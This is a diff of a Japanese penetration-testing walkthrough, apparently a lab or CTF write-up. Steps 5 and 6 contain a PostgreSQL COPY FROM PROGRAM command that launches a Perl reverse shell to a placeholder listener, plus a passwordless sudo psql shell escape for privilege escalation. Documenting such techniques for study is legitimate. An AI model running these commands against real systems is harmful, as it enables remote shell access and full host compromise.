@@ -114,4 +114,16 @@ Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\* |
 
 4. FeroxBusterでconfig.phpにアクセスできることを確認していたので（ブラウザでは解釈され実行されるので中身は確認できなかった）、ファイルの中身を確認すると`postgres`ユーザーの認証情報を入手した
 
-5. postgres ユーザーとして接続し、スーパーユーザーであったため、
+5. postgres DBユーザーとして接続し、スーパーユーザーであったため、postgres としてコマンドを実行し、postgre の OSユーザーを侵害
+```sh
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<LHOST>:<Port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
+```
+
+6. postgres が NO PASSWD psql とあったので、GTFOBinsに従い、権限昇格
+```sh
+# GTFOBinx
+psql
+\! /bin/sh
+```
+``
